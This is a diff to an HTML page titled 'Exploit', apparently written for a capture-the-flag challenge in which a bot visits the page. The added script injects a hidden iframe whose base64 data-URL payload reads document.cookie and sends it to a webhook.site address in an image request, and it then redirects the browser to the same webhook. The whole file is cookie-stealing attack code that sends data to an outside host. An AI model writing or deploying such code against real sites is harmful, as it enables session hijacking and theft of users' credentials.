@@ -1,9 +1,41 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>Exploit</title>
+</head>
 <body>
   <script>
-    // Simple redirect
-    document.location = 'https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?visited=true';
+    // Let's try to exploit the fact that the cookie is likely set on the challenge domain
+    // We'll redirect to a URL on the challenge domain that will embed the cookie in an image src
+    
+    // Assuming the challenge domain is where the bot is running from
+    // This could be localhost:7002 based on your code
+    const targetDomain = window.location.origin; // Get the current origin
+    
+    // Create a hidden iframe that loads a specially crafted page on the target domain
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    
+    // This will try to create an img tag that sends the cookie to our webhook
+    const exploitHTML = `
+      <script>
+        const img = new Image();
+        img.src = "https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?flagcookie=" + encodeURIComponent(document.cookie);
+        document.body.appendChild(img);
+      </script>
+    `;
+    
+    // Convert the HTML to a data URL
+    const dataURL = 'data:text/html;base64,' + btoa(exploitHTML);
+    
+    // Set the iframe src to the data URL
+    iframe.src = dataURL;
+    document.body.appendChild(iframe);
+    
+    // After a short delay, also try a direct navigation
+    setTimeout(() => {
+      window.location = 'https://webhook.site/010ca8d2-641b-4d29-892a-e38468e86f24?navcheck=true';
+    }, 2000);
   </script>
 </body>
 </html>
